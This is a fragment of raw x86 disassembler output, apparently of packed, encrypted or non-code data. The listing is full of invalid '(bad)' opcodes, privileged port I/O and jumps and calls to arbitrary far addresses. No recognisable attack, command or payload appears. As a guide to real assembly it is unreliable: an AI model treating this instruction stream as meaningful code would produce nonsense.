  4158cd:	xor    al,0xd
  4158cf:	cwde   
  4158d0:	(bad)  
  4158d1:	iret   
  4158d2:	pop    es
  4158d3:	mov    ebx,0x5310e731
  4158d8:	fmul   QWORD PTR [ebp-0x29]
  4158db:	rcl    bl,0x7e
  4158de:	mov    al,0xb9
  4158e0:	aam    0x83
  4158e2:	push   ebx
  4158e3:	sahf   
  4158e4:	inc    ebx
  4158e5:	xchg   dh,ch
  4158e7:	mov    ch,0xcc
  4158ea:	not    DWORD PTR [ebp-0x4156f01]
  4158f0:	dec    esi
  4158f1:	jne    0x4158e4
  4158f3:	hlt    
  4158f4:	das    
  4158f5:	ror    ebx,0x2
  4158f8:	add    DWORD PTR [ebx-0x3a097336],ebx
  4158fe:	cs add al,0xcc
  415901:	or     ebp,DWORD PTR [ebx+edi*4-0x6952739f]
  415908:	fidiv  DWORD PTR [edx+eax*4+0x1041b33d]
  41590f:	add    eax,DWORD PTR [ecx+edi*4]
  415912:	xor    al,0x90
  415914:	fwait
  415915:	add    ecx,ebx
  415917:	bound  eax,QWORD PTR [ebp-0x6d]
  41591a:	pop    ds
  41591b:	fs adc al,0x3a
  41591e:	jp     0x415969
  415920:	gs push edi
  415922:	pop    eax
  415923:	push   ebx
  415924:	(bad)
  415927:	mov    ebx,0xceb32699
  41592c:	gs jecxz 0x4158af
  41592f:	mov    ds:0x1828934a,al
  415934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415935:	xor    al,0x90
  415937:	push   es
  415938:	inc    ebx
  415939:	outs   dx,BYTE PTR ds:[esi]
  41593a:	xor    dl,bh
  41593c:	fistp  QWORD PTR [eax+edx*4]
  41593f:	jp     0x415932
  415941:	inc    ecx
  415942:	mov    es,ebp
  415944:	nop
  415945:	fild   QWORD PTR [edi-0x58]
  415948:	scas   eax,DWORD PTR es:[edi]
  415949:	repnz inc edx
  41594b:	icebp  
  41594c:	jbe    0x41596a
  41594e:	bound  ecx,QWORD PTR [eiz*8+0x70573225]
  415955:	ds cdq 
  415957:	std    
  415958:	jno    0x41597b
  41595a:	cmp    DWORD PTR [esi+eax*8+0x419a4cd2],0xffffffb4
  415962:	pop    edx
  415963:	add    DWORD PTR [edi],ebp
  415965:	sbb    bh,al
  415967:	jb     0x4159d7
  415969:	mov    cl,0xdc
  41596b:	pop    ebp
  41596c:	(bad)
  415970:	sbb    ecx,ebx
  415972:	add    DWORD PTR [ecx],eax
  415974:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415975:	nop
  415976:	mov    ch,0x23
  415978:	call   0x168a:0x35ce5d79
  41597f:	addr16 xchg edx,eax
  415981:	pop    esi
  415982:	fstp   TBYTE PTR es:[esi-0x69]
  415986:	mov    bh,bh
  415988:	in     eax,0xb9
  41598a:	test   eax,0x22ef8aa1
  41598f:	pop    ds
	...
  4159f4:	inc    ebp
  4159f5:	mov    BYTE PTR [edi+esi*2],ch
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	out    dx,eax
  415a01:	out    0x59,eax
  415a03:	mov    eax,0xe424
  415a08:	add    al,0x1
  415a0a:	add    BYTE PTR [eax],al
  415a0c:	pop    ecx
  415a0d:	call   0x28b5:0x75b64b04
  415a14:	ficom  DWORD PTR [edx]
  415a16:	jecxz  0x4159e2
  415a18:	push   ss
  415a19:	xchg   ecx,esp
  415a1b:	dec    ecx
  415a1c:	mul    DWORD PTR ds:0x1468445
  415a22:	push   ss
  415a23:	in     al,0x82
  415a25:	std    
  415a26:	retf   
  415a27:	sbb    BYTE PTR ds:0x82fbf751,bl
  415a2d:	mov    esi,fs
  415a2f:	sbb    BYTE PTR [ecx+ecx*1-0x40302d6b],al
  415a36:	in     al,dx
  415a37:	inc    esp
  415a38:	ja     0x415aab
  415a3a:	fld    st(3)
  415a3c:	inc    esi
  415a3d:	pop    es
  415a3e:	sub    eax,0xf3a0af28
  415a43:	adc    eax,0x46367e20
  415a48:	hlt    
  415a49:	ficom  WORD PTR [eax-0x19]
  415a4c:	jns    0x415a82
  415a4e:	in     al,dx
  415a4f:	pop    esi
  415a50:	leave  
  415a51:	or     ebx,esp
  415a53:	popa   
  415a54:	cmp    DWORD PTR [edi*4+0x1233aeb4],ecx
  415a5b:	sti    
  415a5c:	ins    DWORD PTR es:[edi],dx
  415a5d:	sbb    ecx,eax
  415a5f:	jno    0x415a2b
  415a61:	stos   DWORD PTR es:[edi],eax
  415a62:	mov    ebx,0x1c2cea74
  415a67:	outs   dx,BYTE PTR ds:[esi]
  415a68:	xor    al,0x1f
  415a6a:	xchg   ecx,eax
  415a6b:	jne    0x415a65
  415a6d:	xlat   BYTE PTR ds:[ebx]
  415a6e:	(bad)  
  415a6f:	push   fs
  415a71:	lds    edi,FWORD PTR [edx]
  415a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a74:	gs in  al,0xc5
  415a77:	daa    
  415a78:	inc    ebx
  415a79:	sub    ecx,DWORD PTR [eax]
  415a7b:	shr    DWORD PTR [eax+0x6aab6ac5],cl
  415a81:	mov    esp,0x9fa2ade7
  415a86:	xchg   edi,eax
  415a87:	bound  ecx,QWORD PTR [esi-0x69]
  415a8a:	and    bl,bl
  415a8c:	rol    DWORD PTR [eax],cl
  415a8e:	xchg   esi,eax
  415a8f:	xor    BYTE PTR [esi+ecx*1-0xbd4dad9],bl
  415a96:	inc    esi
  415a97:	mov    ecx,0x41c1feff
  415a9c:	int3   
  415a9d:	mov    edi,ebp
  415a9f:	adc    BYTE PTR [esi+0x57],bh
  415aa2:	mov    bl,0xf9
  415aa4:	ret    0xa0e1
  415aa7:	and    al,0x83
  415aa9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415aaa:	cmp    DWORD PTR [ebp+esi*2+0x26],0x99d0e566
  415ab2:	and    eax,0xcf769cfa
  415ab7:	hlt    
  415ab8:	push   edi
  415ab9:	ins    BYTE PTR es:[edi],dx
  415aba:	popa   
  415abb:	sahf   
  415abc:	in     al,0x6e
  415abe:	push   es
  415abf:	jle    0x415af0
  415ac1:	jne    0x415b1b
  415ac3:	es out dx,eax
  415ac5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ac6:	fsub   QWORD PTR [eax+0x40]
  415ac9:	mov    ebp,0x76a5d44b
  415ace:	js     0x415aae
  415ad0:	jb     0x415af0
  415ad2:	cld    
  415ad3:	push   ebp
  415ad4:	xchg   ecx,eax
  415ad5:	mov    edx,0xbf88bbfd
  415ada:	mov    gs,WORD PTR [edx+0x7ddb9f11]
  415ae0:	mov    al,0x9e
  415ae2:	cmp    ebx,ebp
  415ae4:	in     eax,0x5b
  415ae6:	jbe    0x415ac5
  415ae8:	fs icebp 
  415aea:	cmp    eax,0x13c080b5
  415aef:	outs   dx,DWORD PTR ds:[esi]
  415af0:	enter  0xfc06,0x55
  415af4:	inc    edi
  415af5:	lock ss icebp 
  415af8:	mov    ebx,0x12aa7076
  415afd:	(bad)  
  415afe:	mov    al,ds:0xaedceb5f
  415b03:	sub    eax,0xbc702782
  415b08:	xor    al,0x29
  415b0a:	push   edi
  415b0b:	cmp    cl,BYTE PTR [esp+esi*4]
  415b0e:	call   0x0:0x5a
	...
  415b71:	add    BYTE PTR [eax],al
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fcom   QWORD PTR [eax+0x282fa066]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR [ecx+eax*1],al
  415b8a:	add    BYTE PTR [eax],al
  415b8c:	in     eax,dx
  415b8d:	iret   
  415b8e:	xchg   BYTE PTR ds:0xa5c3ad67,dl
  415b94:	ror    DWORD PTR ds:0x384edaa3,1
  415b9a:	mov    eax,DWORD PTR [ebp-0x65]
  415b9d:	enter  0x91f5,0x5f
  415ba1:	popa   
  415ba2:	mov    al,0xda
  415ba4:	jb     0x415be7
  415ba6:	test   eax,0x480ef5ba
  415bab:	mov    edx,0xc8d43dcd
  415bb0:	push   ss
  415bb1:	add    ch,ch
  415bb3:	add    DWORD PTR [ebp-0x7e],ebx
  415bb6:	loopne 0x415b6a
  415bb8:	scas   al,BYTE PTR es:[edi]
  415bb9:	fwait
  415bba:	mov    dl,0xd4
  415bbc:	jmp    0xe51b:0xc87c734d
  415bc3:	push   0x8cb34734
  415bc8:	inc    BYTE PTR [edx+0xe6b3f8d]
  415bce:	sbb    esi,ebp
  415bd0:	in     eax,0x44
  415bd2:	loopne 0x415c21
  415bd4:	(bad)  
  415bd5:	fs sub eax,0xcbd4eb71
  415bdb:	sbb    BYTE PTR [edi-0x53],dl
  415bde:	mov    esp,0x8396345d
  415be3:	test   DWORD PTR [edx-0x40],0x136642d7
  415bea:	mov    dl,0x4e
  415bec:	nop    DWORD PTR [ecx+0x2d]
  415bf0:	mov    edi,ebx
  415bf2:	dec    ecx
  415bf3:	mov    ebp,0xb914b9a5
  415bf8:	or     ah,BYTE PTR [ebp-0x3f]
  415bfb:	mov    edx,edx
  415bfd:	jge    0x415b80
  415bff:	addr16 sbb al,0x30
  415c02:	popaw  
  415c04:	fadd   DWORD PTR [edi+edx*4-0x3843627a]
  415c0b:	fs mov cl,0x5b
  415c0e:	ins    BYTE PTR es:[edi],dx
  415c0f:	jge    0x415bd6
  415c11:	and    al,0x5a
  415c13:	cmp    ah,BYTE PTR [edx+ebx*4-0x7e075b1d]
  415c1a:	mov    bl,BYTE PTR [ebp+0x90f16ec]
  415c20:	dec    edi
  415c21:	shl    BYTE PTR [edi-0x11fd9fc0],0x71
  415c28:	sti    
  415c29:	cwde   
  415c2a:	pop    ss
  415c2b:	ja     0x415c6a
  415c2d:	retf   
  415c2e:	cs push es
  415c30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c31:	cmp    al,0xf6
  415c33:	std    
  415c34:	add    esp,DWORD PTR [esi]
  415c36:	sti    
  415c37:	cs mov eax,0x21222b44
  415c3d:	aam    0x3e
  415c3f:	and    BYTE PTR [eax-0x7a],bl
  415c42:	lock fwait
  415c44:	jecxz  0x415c3c
  415c46:	add    cl,0x4b
  415c49:	retf   
  415c4a:	in     eax,dx
  415c4b:	dec    ebp
  415c4c:	pop    ebx
  415c4d:	sub    al,0x47
  415c4f:	jnp    0x415c24
  415c51:	or     BYTE PTR [esi],cl
  415c53:	mov    ds:0x1d702749,al
  415c58:	mov    ch,0x8
  415c5a:	mov    eax,0x27db6a90
  415c5f:	or     dh,dh
  415c61:	sub    al,0x40
  415c63:	cdq    
  415c64:	xchg   ecx,eax
  415c65:	push   ebx
  415c66:	out    0x4d,eax
  415c68:	pop    esi
  415c69:	push   es
  415c6a:	push   ecx
  415c6b:	call   0xc0e826e5
  415c70:	xlat   BYTE PTR ds:[ebx]
  415c71:	sub    eax,0x94c1b0e2
  415c76:	loop   0x415c72
  415c78:	daa    
  415c79:	es scas eax,DWORD PTR es:[edi]
  415c7b:	pushf  
  415c7c:	pushf  
  415c7d:	sub    ecx,DWORD PTR [ebx+0x4e]
  415c80:	or     DWORD PTR [ecx-0xc],0x4f
  415c84:	fmul   QWORD PTR [ebp-0x1b]
  415c87:	fnstsw WORD PTR [ecx]
  415c89:	push   0x7a
  415c8b:	(bad)  
  415c8e:	jmp    0x0:0x59
	...
  415cf1:	add    BYTE PTR [eax],al
  415cf3:	add    BYTE PTR [edx],bh
  415cf5:	adc    BYTE PTR [edi-0x444040c4],bh
  415cfb:	push   ss
  415cfc:	push   esp
  415cfd:	push   ecx
  415cfe:	mov    esi,0xd90af11f
  415d03:	dec    eax
  415d04:	sub    al,0xe6
  415d06:	add    BYTE PTR [eax],al
  415d08:	add    al,0x1
  415d0a:	add    BYTE PTR [eax],al
  415d0c:	push   eax
  415d0d:	popa   
  415d0e:	cmp    ah,dl
  415d10:	mov    cl,0xec
  415d12:	subps  xmm0,XMMWORD PTR [ebp-0x2e078186]
  415d19:	(bad)  
  415d1b:	fisub  WORD PTR [edi-0x2a]
  415d1e:	fmul   DWORD PTR [edi+0x7e]
  415d21:	pop    esi
  415d22:	lahf   
  415d23:	call   0xc720b17d
  415d28:	jp     0x415d9c
  415d2a:	jmp    0x415d95
  415d2c:	pop    eax
  415d2d:	test   al,0x39
  415d2f:	mov    al,ds:0x3fcec8b7
  415d34:	xlat   BYTE PTR ds:[ebx]
  415d35:	outs   dx,BYTE PTR ds:[esi]
  415d36:	repz les esi,FWORD PTR [edx+0x7d]
  415d3a:	cmc    
  415d3b:	pop    ebx
  415d3c:	sub    eax,0x63d7010d
  415d41:	div    BYTE PTR [esi]
  415d43:	push   edx
  415d44:	xlat   BYTE PTR ds:[ebx]
  415d45:	mov    DWORD PTR [ebp-0x6e60aad8],edx
  415d4b:	adc    ebp,DWORD PTR [esi]
  415d4d:	pop    ecx
  415d4e:	addr16 ret 0x83d5
  415d52:	(bad)  
  415d53:	xor    edx,DWORD PTR [eax+0x734bad2b]
  415d59:	xor    ecx,DWORD PTR [ebp+0x40]
  415d5c:	popf   
  415d5d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d5e:	pop    es
  415d5f:	sub    dh,al
  415d61:	jl     0x415d25
  415d63:	mov    esi,0x6aa62833
  415d68:	sbb    DWORD PTR [ebp+0x2b948697],eax
  415d6e:	sbb    dh,BYTE PTR [eax+edi*1-0x6a]
  415d72:	sbb    BYTE PTR [ebp+ebx*2-0x1e42582e],bl
  415d79:	cli    
  415d7a:	aam    0x52
  415d7c:	adc    ebx,DWORD PTR [edi-0x349a5015]
  415d82:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415d83:	lahf   
  415d84:	mov    ecx,0xb3654749
  415d89:	sbb    al,0x56
  415d8b:	call   0x75ac78e5
  415d90:	dec    esp
  415d91:	lods   eax,DWORD PTR ds:[esi]
  415d92:	ja     0x415dc7
  415d94:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d95:	dec    esp
  415d96:	adc    al,0xbc
  415d98:	sti    
  415d99:	adc    al,BYTE PTR [eax-0x1f]
  415d9c:	int    0x7d
  415d9e:	in     al,dx
  415d9f:	mov    ch,BYTE PTR [ecx-0x528142ed]
  415da5:	mov    dh,0x6a
  415da7:	cdq    
  415da8:	int    0x54
  415daa:	inc    esi
  415dab:	fisubr WORD PTR [esi-0x27]
  415dae:	and    eax,0x3914c827
  415db3:	test   BYTE PTR [eax-0x1c],0x6a
  415db7:	bound  ebx,QWORD PTR [eax+0x61728071]
  415dbd:	iret   
  415dbe:	adc    DWORD PTR [ebx-0x5bde0244],edx
  415dc4:	lods   al,BYTE PTR ds:[esi]
  415dc5:	jbe    0x415e1e
  415dc7:	and    al,0x14
  415dc9:	inc    esp
  415dca:	or     dl,BYTE PTR [ecx+0x6bdbb327]
  415dd0:	int    0x7
  415dd2:	xlat   BYTE PTR ds:[ebx]
  415dd3:	push   ecx
  415dd4:	fistp  QWORD PTR [ecx-0x53]
  415dd7:	dec    ebp
  415dd8:	fadd   QWORD PTR [ecx]
  415dda:	jns    0x415da2
  415ddc:	call   0xdff6f384
  415de1:	dec    edx
  415de2:	inc    BYTE PTR [esi-0x1138d30c]
  415de8:	adc    BYTE PTR [ebx+0x1c],dh
  415deb:	dec    ebx
  415dec:	dec    eax
  415ded:	adc    DWORD PTR [edx-0x453532e9],ebp
  415df3:	xchg   edx,eax
  415df4:	inc    esp
  415df5:	outs   dx,DWORD PTR ds:[esi]
  415df6:	jg     0x415e45
  415df8:	test   al,0xee
  415dfa:	es pop eax
  415dfc:	add    eax,0x9a8eaa5
  415e01:	loope  0x415d83
  415e03:	inc    esp
  415e04:	adc    BYTE PTR [ecx-0x2e],bl
  415e07:	jns    0x415e1c
  415e09:	repz jnp 0x415e2c
  415e0c:	and    BYTE PTR [edi],dh
  415e0e:	push   ebx
  415e0f:	adc    eax,0x0
	...
  415e74:	out    dx,al
  415e75:	repnz cmc 
  415e77:	add    edi,ebp
  415e79:	pop    es
  415e7a:	(bad)  
  415e7b:	call   FWORD PTR [ebp+0x1f]
  415e7e:	les    esi,FWORD PTR [eax-0x69]
  415e81:	loop   0x415e5d
  415e83:	retf   0xe730
  415e86:	add    BYTE PTR [eax],al
  415e88:	add    al,0x1
  415e8a:	add    BYTE PTR [eax],al
  415e8c:	add    eax,0x713dcce8
  415e91:	ds adc ebx,ecx
  415e94:	daa    
  415e95:	(bad)  
  415e96:	cld    
  415e97:	dec    edi
  415e98:	out    dx,al
  415e99:	test   edi,eax
  415e9b:	cmp    eax,0x16b927fc
  415ea0:	adc    ah,BYTE PTR [ecx]
  415ea2:	stc    
  415ea3:	pop    ebx
  415ea4:	ins    DWORD PTR es:[edi],dx
  415ea5:	jmp    0x7b58f6f8
  415eaa:	neg    ch
  415eac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ead:	pop    eax
  415eae:	in     al,0x9b
  415eb0:	inc    edx
  415eb1:	dec    ebp
  415eb2:	fdivr  st(5),st
  415eb4:	inc    ebx
  415eb5:	dec    ebx
  415eb6:	inc    edx
  415eb7:	pop    esp
  415eb8:	add    esp,ecx
  415eba:	shr    DWORD PTR [esi],cl
  415ebc:	adc    dh,BYTE PTR [edi]
  415ebe:	shl    DWORD PTR [edx-0xd34e767],0x2a
  415ec5:	in     eax,0xe4
  415ec7:	pop    es
  415ec8:	out    0x8,eax
  415eca:	add    edx,esi
  415ecc:	sub    DWORD PTR [edx-0x193a2f2d],ebp
  415ed2:	setno  dh
  415ed5:	pop    esi
  415ed6:	adc    DWORD PTR [ecx],ecx
  415ed8:	jb     0x415f20
  415eda:	xchg   ecx,eax
  415edb:	and    BYTE PTR [eax-0x44780dea],ch
  415ee1:	jno    0x415f25
  415ee3:	jl     0x415f0b
  415ee5:	repnz sub ebp,DWORD PTR [ebp-0x73]
  415ee9:	jae    0x415f4b
  415eeb:	push   0x15
  415eed:	pushf  
  415eee:	cmc    
  415eef:	retf   0x65ad
  415ef2:	(bad)  
  415ef3:	aam    0xfa
  415ef5:	jno    0x415ee8
  415ef7:	rol    BYTE PTR [edx+0x5],0x60
  415efb:	xor    al,BYTE PTR [edx-0x19]
  415efe:	push   eax
  415eff:	xchg   ebp,eax
  415f00:	jne    0x415f2e
  415f02:	inc    eax
  415f03:	dec    esp
  415f04:	into   
  415f05:	pop    edi
  415f06:	pop    ecx
  415f07:	addr16 loop 0x415f1c
  415f0a:	add    esp,0x183c096e
  415f10:	stos   BYTE PTR es:[edi],al
  415f11:	call   eax
  415f13:	pop    ebx
  415f14:	inc    eax
  415f15:	push   ss
  415f16:	or     BYTE PTR [eax+0x72],0xef
  415f1a:	sub    DWORD PTR [esi-0x9],edi
  415f1d:	and    DWORD PTR [edi+0xe],esp
  415f20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415f21:	mov    eax,0xa07410be
  415f26:	js     0x415f3a
  415f28:	or     BYTE PTR [esi],bh
  415f2a:	push   cs
  415f2b:	xchg   edi,eax
  415f2c:	imul   ebx,ebx,0x1d854787
  415f32:	adc    al,0x74
  415f34:	xchg   dl,ch
  415f36:	mov    esi,0x39f67109
  415f3b:	add    bl,BYTE PTR [esi-0x29814a84]
  415f41:	test   eax,0x86ee4629
  415f46:	add    ch,BYTE PTR [ebx+0x10]
  415f49:	repnz loope 0x415fa1
  415f4c:	jb     0x415f28
  415f4e:	inc    ebx
  415f50:	loop   0x415f33
  415f52:	pop    ebx
  415f53:	cmp    edi,DWORD PTR [ebp+0x45]
  415f56:	xchg   esi,eax
  415f57:	sub    bl,BYTE PTR [eax+0x28abdf35]
  415f5d:	xchg   ebp,eax
  415f5e:	mov    ecx,DWORD PTR [eax]
  415f60:	mov    ds:0x301f3196,eax
  415f65:	sub    ebx,DWORD PTR [eax-0x18efd3d2]
  415f6b:	push   ebp
  415f6c:	xor    esp,esi
  415f6e:	jnp    0x415f60
  415f70:	sub    bh,dl
  415f72:	cld    
  415f73:	arpl   si,bx
  415f75:	je     0x415f8a
  415f77:	mov    dl,0x1
  415f79:	std    
  415f7a:	out    dx,al
  415f7b:	cmc    
  415f7c:	jmp    0xe260:0x7b7ffc43
  415f83:	cmp    BYTE PTR [edx],0x3
  415f86:	neg    BYTE PTR [esp+eax*1]
  415f89:	xlat   BYTE PTR ds:[ebx]
  415f8a:	xlat   BYTE PTR ds:[ebx]
  415f8b:	xchg   cl,bl
  415f8d:	data16 mov dh,0xa9
	...
  415ff4:	pop    ss
  415ff5:	mov    BYTE PTR [esi-0x6e],ch
  415ff8:	push   esi
  415ffa:	dec    DWORD PTR [ebp-0x37ca37e8]
  416000:	jecxz  0x415fc2
  416002:	push   ebx
  416003:	sysenter 
  416005:	call   0x145600a
  41600a:	add    BYTE PTR [eax],al
  41600c:	fldenv [esi+0x63c97616]
  416012:	pop    es
  416013:	xchg   ecx,eax
  416014:	mov    esp,0x5f8a1aca
  416019:	sbb    ch,BYTE PTR [eax-0x67f4d269]
  41601f:	inc    edi
  416020:	adc    DWORD PTR [ecx+0x716e5e04],edi
  416026:	ins    BYTE PTR es:[edi],dx
  416027:	mov    ch,0xa7
  416029:	mov    dh,0x5d
  41602b:	adc    ebp,ebx
  41602d:	(bad)  
  41602e:	mov    esp,0xcc2add18
  416033:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416034:	and    ah,BYTE PTR [edi+0x6b]
  416037:	scas   al,BYTE PTR es:[edi]
  416038:	sbb    bh,dl
  41603a:	stc    
  41603b:	or     DWORD PTR [ecx],edx
  41603d:	aam    0x77
  41603f:	jbe    0x415fc1
  416041:	dec    DWORD PTR [ebp+0x7a7a79cc]
  416047:	nop
  416048:	mov    dh,0xcf
  41604a:	cmp    al,0x4b
  41604c:	mov    ah,0xe3
  41604e:	mov    eax,0x4a74c3e4
  416053:	sbb    BYTE PTR ds:[ebp+0xf],ah
  416057:	fwait
  416058:	sub    DWORD PTR [ebx-0xc],esi
  41605b:	daa    
  41605c:	and    DWORD PTR gs:[edi+esi*8-0x61f0fb66],edx
  416064:	or     bh,al
  416066:	push   ebp
  416067:	or     BYTE PTR [ebx+0x73],ch
  41606a:	or     BYTE PTR gs:[edx*2-0x48958ff0],0x32
  416073:	push   0xffffffea
  416075:	lock pop ebx
  416077:	fnstsw WORD PTR [ebx]
  416079:	push   0x76e18d69
  41607e:	mov    ?,edx
  416080:	shr    BYTE PTR [esp+eiz*4-0x47],cl
  416084:	jg     0x416036
  416086:	add    al,0x97
  416088:	les    ecx,FWORD PTR [edx]
  41608a:	pop    ss
  41608b:	push   0xcd05e261
  416090:	fwait
  416091:	xchg   edx,eax
  416092:	sti    
  416093:	and    BYTE PTR [edi],dh
  416095:	mov    dh,0x6e
  416097:	pop    edx
  416098:	mov    esi,DWORD PTR [eax+edx*1+0xb5eb35c]
  41609f:	iret   
  4160a0:	dec    edx
  4160a1:	xchg   ebx,eax
  4160a2:	pop    edi
  4160a3:	ins    DWORD PTR es:[edi],dx
  4160a4:	cmp    BYTE PTR [esi+0x22ac6ad1],bl
  4160aa:	test   DWORD PTR [ecx+eax*8-0x7f19d160],0xcc2bea6
  4160b5:	clc    
  4160b6:	test   BYTE PTR [eax+0x37522feb],dh
  4160bc:	add    al,cl
  4160be:	jmp    0x41606b
  4160c0:	sbb    eax,0x535fcbf6
  4160c5:	jbe    0x41604e
  4160c7:	mov    DWORD PTR [eax-0x20],edx
  4160ca:	cmp    al,0x7
  4160cc:	js     0x416067
  4160ce:	jl     0x41605f
  4160d0:	dec    ecx
  4160d1:	pop    ss
  4160d2:	fsubr  DWORD PTR [ebx+0x47]
  4160d5:	fist   DWORD PTR [ebx]
  4160d7:	scas   al,BYTE PTR es:[edi]
  4160d8:	out    0xab,ax
  4160db:	xchg   DWORD PTR [esi+ecx*4-0x50],esi
  4160df:	sbb    esp,DWORD PTR [ebp-0x1c1404cd]
  4160e5:	or     DWORD PTR [ebp-0x51aee92f],ebx
  4160eb:	fmul   DWORD PTR ds:0x53ea87ae
  4160f1:	and    ch,ah
  4160f3:	jbe    0x416094
  4160f5:	test   DWORD PTR [esi],ebx
  4160f7:	cmp    eax,0xa543abd2
  4160fc:	jmp    DWORD PTR [ebx+0x15]
  4160ff:	xchg   ebp,esp
  416101:	leave  
  416102:	mov    ds:0x201a7365,al
  416107:	or     bh,BYTE PTR [ecx+0x77de10c7]
  41610d:	inc    esi
  41610e:	scas   eax,DWORD PTR es:[edi]
  41610f:	mov    BYTE PTR [eax],al
	...
  416171:	add    BYTE PTR [eax],al
  416173:	add    BYTE PTR [eax],ah
  416175:	jmp    0xdf3d3fb5
  41617a:	in     eax,0xff
  41617c:	(bad)  
  41617d:	push   edx
  41617e:	sub    eax,0x52a333f3
  416183:	push   0x38
  416185:	jmp    0x145618a
  41618a:	add    BYTE PTR [eax],al
  41618c:	int    0xbf
  41618e:	retf   
  41618f:	loope  0x416148
  416191:	pushf  
  416192:	imul   BYTE PTR [edx-0x502da25a]
  416198:	pmaxsw mm7,QWORD PTR [ebp+eiz*4-0x3b2b524d]
  4161a0:	inc    ecx
  4161a1:	push   0x2f
  4161a3:	push   esp
  4161a4:	imul   eax,DWORD PTR [ebp+0x4],0x5d
  4161a8:	jno    0x416152
  4161aa:	xor    eax,0x55fdc4bc
  4161af:	push   ebx
  4161b0:	push   ss
  4161b1:	sub    eax,0x77101286
  4161b6:	fwait
  4161b7:	loope  0x41613b
  4161b9:	jecxz  0x416176
  4161bb:	or     eax,0x52ad2c83
  4161c0:	sbb    eax,0xa2ea9869
  4161c5:	mov    es,WORD PTR [edi+0x6b]
  4161c8:	retf   0xa135
  4161cb:	add    cl,BYTE PTR [eax-0x5790982e]
  4161d1:	imul   esi,DWORD PTR [ebp+0x53],0xfffffff6
  4161d5:	cmp    eax,esi
  4161d7:	push   0xe28c83a9
  4161dc:	sar    BYTE PTR [ecx-0x2a4e8501],1
  4161e2:	js     0x416248
  4161e4:	test   BYTE PTR [edi+0x12],ah
  4161e7:	pop    eax
  4161e8:	xchg   ebp,eax
  4161e9:	call   0xddce5ac0
  4161ee:	push   0xffffffb4
  4161f0:	jne    0x4161a0
  4161f2:	xor    ebx,esi
  4161f4:	enter  0x363c,0xc5
  4161f8:	xchg   ebp,eax
  4161f9:	or     eax,0x8cae3736
  4161fe:	push   esp
  4161ff:	imul   ebp,DWORD PTR [ebx-0x4b],0xffffffe9
  416203:	pop    edx
  416204:	rol    DWORD PTR [eax+0x5a52b294],0xca
  41620b:	sub    DWORD PTR [edi+ebx*8+0x71],eax
  41620f:	or     al,0x13
  416211:	lock sbb bl,dl
  416214:	inc    ebx
  416215:	jno    0x416285
  416217:	pusha  
  416218:	mul    BYTE PTR [esi-0x2a33618c]
  41621e:	mov    esp,0x7a87c842
  416223:	int3   
  416224:	xchg   ebx,eax
  416225:	jmp    0x416257
  416227:	adc    ch,dh
  416229:	add    al,0x9
  41622b:	add    DWORD PTR [edx-0x75161527],edi
  416231:	sti    
  416232:	icebp  
  416233:	in     al,0x6d
  416235:	call   0xe382639b
  41623a:	mov    al,0xbe
  41623c:	rcl    DWORD PTR [eax-0x97cb583],1
  416242:	pop    edi
  416243:	hlt    
  416244:	mov    dh,0x1a
  416246:	pop    es
  416247:	jp     0x416234
  416249:	or     DWORD PTR [esi+edi*2],ecx
  41624c:	lock dec ebx
  41624e:	push   cs
  41624f:	xchg   ebp,eax
  416250:	and    DWORD PTR [esi-0x6c7f8624],0x39
  416257:	or     BYTE PTR [ebp+0x26],dl
  41625a:	(bad)  
  41625b:	in     al,dx
  41625c:	lea    ebx,[ecx+0x390d55e7]
  416262:	lea    edx,[ecx+0x68]
  416265:	call   0x9494dd2e
  41626a:	lods   al,BYTE PTR ds:[esi]
  41626b:	xchg   ebp,eax
  41626c:	adc    bh,BYTE PTR [esi-0x5c75c467]
  416272:	bound  edi,QWORD PTR [ebx+ebx*4]
  416275:	hlt    
  416276:	mov    bh,0xd3
  416278:	sti    
  416279:	dec    edx
  41627a:	xchg   ebp,eax
  41627b:	das    
  41627c:	sub    BYTE PTR [esi-0x1b],dh
  41627f:	sub    DWORD PTR [esp+edi*2],esp
  416282:	sahf   
  416283:	ficomp WORD PTR [esi-0x5fcb2251]
  416289:	pop    eax
  41628a:	bound  edi,QWORD PTR [edi+0x6b]
  41628d:	std    
  41628e:	shr    DWORD PTR [ecx+0x0],1
	...
  4162f1:	add    BYTE PTR [eax],al
  4162f3:	add    BYTE PTR [ebx],ah
  4162f5:	outs   dx,BYTE PTR ds:[esi]
  4162f6:	xor    ah,BYTE PTR ds:0x6e377d7f
  4162fc:	mov    bl,0x5f
  4162fe:	call   0x3c14:0xc799d8ee
  416305:	jmp    0x0:0x1040000
  41630c:	rcl    BYTE PTR [ecx],1
  41630e:	jg     0x4162ff
  416310:	pop    eax
  416311:	pop    es
  416312:	lds    ebp,FWORD PTR [ebp+ecx*2+0x7cc30855]
  416319:	add    eax,0x46724db1
  41631e:	(bad)  
  41631f:	xor    DWORD PTR [ebx],edi
  416321:	push   edi
  416322:	loopne 0x416376
  416324:	xchg   esp,eax
  416325:	sbb    ebx,DWORD PTR [ebp+0xa149510]
  41632b:	test   DWORD PTR [ebx-0x2],edx
  41632e:	jns    0x4162fe
  416330:	and    eax,0xb44b6a1c
  416335:	sub    eax,0xbcfc79b0
  41633a:	push   esi
  41633b:	ins    BYTE PTR es:[edi],dx
  41633c:	and    DWORD PTR [eax+0x3ddab354],0xba135c3b
  416346:	dec    ecx
  416347:	imul   esi,eax,0x22
  41634a:	pop    ebx
  41634b:	xor    eax,0xecea945e
  416350:	xchg   esi,eax
